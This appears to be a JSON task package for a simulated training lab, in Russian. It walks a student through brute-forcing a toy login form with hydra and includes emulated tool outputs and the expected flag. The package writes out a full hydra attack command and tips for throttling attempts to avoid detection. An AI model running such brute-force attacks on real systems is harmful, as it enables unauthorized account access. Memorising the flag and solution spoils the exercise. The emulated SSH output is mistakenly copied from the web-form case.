@@ -1,0 +1,67 @@
+{
+ "id": "crypto-tool-hydra-medusa-patator",
+ "workdir": "/home/student/task",
+ "hostname": "lab",
+ "expect": {
+  "file": "/home/student/task/found.txt",
+  "contains": "nto{hydr4_cur4t3d_w0rdl1st_w1ns}"
+ },
+ "fs": [
+  {
+   "path": "/home/student/task",
+   "type": "dir"
+  },
+  {
+   "path": "/home/student/task/task.md",
+   "text": "# Задача: онлайн-подбор учётных данных (hydra)\n\nЕсть учебная форма логина на `10.0.0.5`. Есть маленький курированный словарь\n`pass.txt`. Нужно подобрать пароль и прочитать флаг из админ-панели.\n\nШаги:\n1. `cat pass.txt` — посмотри словарь (rockyou лить нельзя, бюджет ограничен).\n2. Определи fail-string: `cat response.txt` (ответ на неверную пару).\n3. Запусти hydra:\n   `hydra -l admin -P pass.txt 10.0.0.5 http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid credentials\"`.\n4. hydra выведет найденный пароль. Зайди в панель:\n   `curl -u admin:Summer2025! http://10.0.0.5/admin`.\n5. Сохрани флаг: `curl -u admin:Summer2025! http://10.0.0.5/admin | grep nto > found.txt`.\n"
+  },
+  {
+   "path": "/home/student/task/notes.txt",
+   "text": "Заметки:\n- fail-string (F=) — строка, которая есть только при НЕУДАЧЕ; без неё hydra считает успехом всё.\n- `-t 4` и пауза `-W` вместо 64 потоков: не засветиться и не заблокировать аккаунт.\n- Проверяй UNAUTH раньше брута (anon FTP, Redis/Mongo без пароля, дефолтные админки).\n"
+  },
+  {
+   "path": "/home/student/task/login_server.py",
+   "text": "import threading, urllib.request, urllib.parse\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nVALID = {\"admin\": \"Summer2025!\"}\n\nclass H(BaseHTTPRequestHandler):\n    def do_POST(self):\n        n = int(self.headers.get(\"Content-Length\", 0))\n        body = urllib.parse.parse_qs(self.rfile.read(n).decode())\n        u = (body.get(\"username\") or [\"\"])[0]\n        p = (body.get(\"password\") or [\"\"])[0]\n        ok = VALID.get(u) == p\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b\"Welcome, admin\" if ok else b\"Invalid credentials\")\n    def log_message(self, *a): pass\n\nif __name__ == \"__main__\":\n    HTTPServer((\"0.0.0.0\", 80), H).serve_forever()\n"
+  },
+  {
+   "path": "/home/student/task/pass.txt",
+   "text": "password\nadmin\n123456\nSummer2025!\nletmein\nqwerty\n"
+  },
+  {
+   "path": "/home/student/task/response.txt",
+   "text": "неверная пара -> 'Invalid credentials'\nверная пара   -> 'Welcome, admin'\n-> fail-string для hydra: F=Invalid credentials\n"
+  }
+ ],
+ "tools": {
+  "hydra": {
+   "help": "hydra [флаги] <цель> <модуль> [параметры] — эмуляция hydra",
+   "cases": [
+    {
+     "match": "http-post-form",
+     "example": "-l admin -P pass.txt 10.0.0.5 http-post-form \"/login:...:F=Invalid credentials\"",
+     "output": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-13 21:20:00\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task\n[DATA] attacking http-post-form://10.0.0.5:80/login:username=^USER^&password=^PASS^:F=Invalid credentials\n[80][http-post-form] host: 10.0.0.5   login: admin   password: Summer2025!\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-13 21:20:03\n"
+    },
+    {
+     "match": "ssh",
+     "example": "-l admin -P pass.txt ssh://10.0.0.5",
+     "output": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-13 21:20:00\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task\n[DATA] attacking http-post-form://10.0.0.5:80/login:username=^USER^&password=^PASS^:F=Invalid credentials\n[80][http-post-form] host: 10.0.0.5   login: admin   password: Summer2025!\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-13 21:20:03\n"
+    }
+   ]
+  },
+  "curl": {
+   "help": "curl [опции] <URL> — эмуляция curl",
+   "cases": [
+    {
+     "match": "Summer2025",
+     "example": "-u admin:Summer2025! http://10.0.0.5/admin",
+     "output": "<!DOCTYPE html>\n<html><head><title>Admin panel</title></head>\n<body>\n<h1>Admin panel</h1>\n<p>Authenticated as admin.</p>\n<p>secret: nto{hydr4_cur4t3d_w0rdl1st_w1ns}</p>\n</body></html>\n"
+    },
+    {
+     "match": "10\\.0\\.0\\.5/admin",
+     "example": "-u admin:wrong http://10.0.0.5/admin",
+     "output": "<html><head><title>401 Unauthorized</title></head>\n<body><h1>401 Unauthorized</h1>\n<p>Authentication required.</p></body></html>\n"
+    }
+   ]
+  }
+ }
+}
